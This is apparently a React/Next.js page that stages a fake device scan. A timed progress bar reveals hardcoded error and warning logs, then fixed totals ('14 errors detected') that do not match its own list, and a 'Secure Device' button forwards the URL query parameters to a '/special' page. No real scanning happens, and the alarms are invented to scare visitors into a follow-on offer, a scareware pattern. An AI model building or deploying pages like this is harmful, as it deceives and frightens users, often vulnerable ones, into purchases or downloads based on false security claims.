'use client'

import { useEffect, useState, useRef } from 'react'
import { useRouter } from 'next/navigation'
import Link from 'next/link'

const logsData = [
	{
		code: '184726',
		type: 'error',
		desc: 'auth_session_expired while validating cached credentials',
	},
	{
		code: '672940',
		type: 'error',
		desc: 'api_gateway_timeout upstream service did not respond',
	},
	{
		code: '781204',
		type: 'good',
		desc: 'auth_session_restore completed without conflicts',
	},
	{
		code: '438219',
		type: 'error',
		desc: 'database_write_failed constraint violation on user_state',
	},
	{
		code: '590318',
		type: 'error',
		desc: 'config_reload_failed malformed environment override',
	},
	{
		code: '149285',
		type: 'warning',
		desc: 'service_health_probe returned degraded status',
	},
	{
		code: '826104',
		type: 'error',
		desc: 'cache_index_corrupted checksum validation failed',
	},
	{
		code: '902347',
		type: 'warning',
		desc: 'ui_render_queue skipped delayed frame update',
	},
	{
		code: '305771',
		type: 'error',
		desc: 'message_queue_overflow dropped pending sync events',
	},
	{
		code: '947260',
		type: 'error',
		desc: 'permission_scope_mismatch requested token lacks required grant',
	},
	{
		code: '612804',
		type: 'warning',
		desc: 'retry_policy_triggered after unstable endpoint response',
	},
	{
		code: '218604',
		type: 'error',
		desc: 'storage_volume_full unable to persist diagnostic snapshot',
	},
	{
		code: '763915',
		type: 'error',
		desc: 'ssl_certificate_expired secure channel negotiation failed',
	},
	{
		code: '845601',
		type: 'good',
		desc: 'file_descriptor_cleanup released inactive handles',
	},
	{
		code: '409582',
		type: 'error',
		desc: 'worker_thread_crashed unhandled exception in task executor',
	},
	{
		code: '506128',
		type: 'warning',
		desc: 'network_jitter_high packet variance above threshold',
	},
	{
		code: '681337',
		type: 'error',
		desc: 'rate_limit_exceeded client exceeded retry budget',
	},
]

export default function ScanPage2() {
	const router = useRouter()
	const [progress, setProgress] = useState(0)
	const [visibleLogs, setVisibleLogs] = useState<typeof logsData>([])
	const [isComplete, setIsComplete] = useState(false)
	const containerRef = useRef<HTMLDivElement>(null)

	useEffect(() => {
		const scanDuration = 3000
		const updateInterval = 50
		const step = 100 / (scanDuration / updateInterval)
		let currentProgress = 0

		const timer = setInterval(() => {
			currentProgress += step
			if (currentProgress >= 100) {
				currentProgress = 100
				clearInterval(timer)
				setTimeout(() => setIsComplete(true), 400)
			}

			setProgress(currentProgress)
			const targetLogsCount = Math.floor(
				(currentProgress / 100) * logsData.length,
			)
			setVisibleLogs(logsData.slice(0, targetLogsCount))

			if (containerRef.current) {
				containerRef.current.scrollTop = containerRef.current.scrollHeight
			}
		}, updateInterval)

		return () => clearInterval(timer)
	}, [])

	// Сохраняем квери параметры для следующей страницы
	const specialUrl =
		typeof window !== 'undefined'
			? `/special${window.location.search}`
			: '/special'

	return (
		<>
			<style
				dangerouslySetInnerHTML={{
					__html: `
				:root { 
                    --bg-color: #f4f4f7; 
                    --blue: #007aff; 
                    --red: #ff3b30; 
                    --orange: #ff9500; 
                    --green: #34c759; 
                    --gray-text: #8e8e93; 
                }
				* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
				body { display: flex; justify-content: center; align-items: center; background: #f0f1f4; min-height: 100vh; }
				.mobile-container { width: 100%; max-width: 430px; height: 100vh; background-color: var(--bg-color); display: flex; flex-direction: column; overflow: hidden; }
				
                .header-text { padding: 30px 20px 10px; text-align: center; font-size: 20px; font-weight: 700; color: #333; }
				
                .progress-box { background: #fff; margin: 10px 20px; padding: 15px 20px; border-radius: 16px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03); flex-shrink: 0; }
				.progress-track { flex: 1; background-color: #e5e5ea; height: 10px; border-radius: 5px; overflow: hidden; }
				.progress-fill { background-color: var(--blue); height: 100%; border-radius: 5px; transition: width 0.1s linear; }
				.progress-percent { color: var(--blue); font-weight: 700; font-size: 16px; min-width: 45px; text-align: right; }
				
                .table-wrapper { flex: 1; margin: 10px 20px; background: #fff; border-radius: 16px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03); min-height: 0; }
				.table-container { display: flex; flex-direction: column; height: 100%; }
				.table-header { display: flex; padding: 12px 15px; background: #f9f9f9; border-bottom: 1px solid #eee; font-size: 13px; font-weight: 600; color: #555; flex-shrink: 0; }
				.col-code { width: 22%; }
				.col-process { width: 30%; }
				.col-message { width: 48%; }
				
                .table-body { flex: 1; overflow-y: auto; display: flex; flex-direction: column; padding: 5px 0; }
				.table-body::-webkit-scrollbar { width: 0px; }
				.table-row { display: flex; padding: 10px 15px; border-bottom: 1px solid #f5f5f5; align-items: flex-start; animation: fadeIn 0.3s ease-out forwards; }
				.table-row:last-child { border-bottom: none; }
				@keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
				
                .cell-code { width: 22%; font-family: monospace; font-size: 13px; color: #333; margin-top: 2px; }
				.cell-process { width: 30%; }
				.cell-message { width: 48%; font-size: 12px; color: var(--gray-text); line-height: 1.3; }
				
                .badge { display: inline-block; padding: 4px 8px; border-radius: 8px; font-size: 10px; font-weight: 700; text-transform: uppercase; }
				.badge.error { background: #ffe5e5; color: var(--red); }
				.badge.warning { background: #fff4e5; color: var(--orange); }
				.badge.good { background: #e5f9e5; color: var(--green); }
				
                .result-section { padding: 10px 20px; animation: fadeIn 0.5s ease-out forwards; flex-shrink: 0; }
				.result-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #333; }
				.card-critical { background: #000; color: white; padding: 15px; border-radius: 16px; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
				.card-critical img { width: 32px; height: 32px; }
				.card-critical-info .num { font-size: 24px; font-weight: 800; line-height: 1; }
				.card-critical-info .label { font-size: 13px; opacity: 0.9; margin-top: 2px; }
				
                .stats-row { display: flex; gap: 10px; }
				.card-stat { flex: 1; background: #fff; padding: 12px; border-radius: 12px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03); }
				.card-stat img { width: 24px; height: 24px; }
				.stat-text { font-size: 12px; font-weight: 500; color: #333; }
				.stat-text .val { font-size: 16px; font-weight: 700; margin-right: 4px; }
				.text-orange { color: var(--orange); }
				.text-green { color: var(--green); }
				
                .bottom-actions { padding: 10px 20px; flex-shrink: 0; }
				.action-btn { display: flex; justify-content: center; align-items: center; background-color: var(--blue); color: white; border: none; border-radius: 25px; padding: 16px; font-size: 16px; font-weight: 600; text-decoration: none; width: 100%; transition: 0.3s; }
				.action-btn.disabled { opacity: 0.5; pointer-events: none; }
				
                .footer { text-align: center; padding-bottom: 20px; flex-shrink: 0; }
				.privacy-link { color: var(--gray-text); text-decoration: none; font-size: 12px; font-weight: 600; }
				.copyright { color: var(--gray-text); font-size: 11px; margin-top: 5px; }
			`,
				}}
			/>

			<div className='mobile-container'>
				<div className='header-text'>
					{isComplete ? 'Analysis completed' : 'Analyzing your device...'}
				</div>

				<div className='progress-box'>
					<div className='progress-track'>
						<div
							className='progress-fill'
							style={{ width: `${progress}%` }}
						></div>
					</div>
					<div className='progress-percent'>{Math.floor(progress)}%</div>
				</div>

				<div className='table-wrapper'>
					<div className='table-container'>
						<div className='table-header'>
							<div className='col-code'>Code</div>
							<div className='col-process'>Process</div>
							<div className='col-message'>Message</div>
						</div>

						<div className='table-body' ref={containerRef}>
							{visibleLogs.map((log, idx) => (
								<div key={idx} className='table-row'>
									<div className='cell-code'>{log.code}</div>
									<div className='cell-process'>
										<div className={`badge ${log.type}`}>{log.type}</div>
									</div>
									<div className='cell-message'>{log.desc}</div>
								</div>
							))}
						</div>
					</div>
				</div>

				{isComplete && (
					<div className='result-section'>
						<div className='result-title'>Result</div>

						<div className='card-critical'>
							<img src='/img/scan2-ic1.svg' alt='icon' />
							<div className='card-critical-info'>
								<div className='num'>14</div>
								<div className='label'>errors detected</div>
							</div>
						</div>

						<div className='stats-row'>
							<div className='card-stat'>
								<img src='/img/scan2-ic2.svg' alt='icon' />
								<div className='stat-text'>
									<span className='val text-orange'>5</span> warnings found
								</div>
							</div>
							<div className='card-stat'>
								<img src='/img/scan2-ic3.svg' alt='icon' />
								<div className='stat-text'>
									<span className='val text-green'>3</span> checks passed
								</div>
							</div>
						</div>
					</div>
				)}

				<div className='bottom-actions'>
					<Link
						href={specialUrl}
						className={`action-btn ${!isComplete ? 'disabled' : ''}`}
					>
						Secure Device
					</Link>
				</div>

				<div className='footer'>
					<a href='/policy' target='_blank' className='privacy-link'>
						Privacy Policy
					</a>
					<div className='copyright'>© 2026. All rights reserved.</div>
				</div>
			</div>
		</>
	)
}
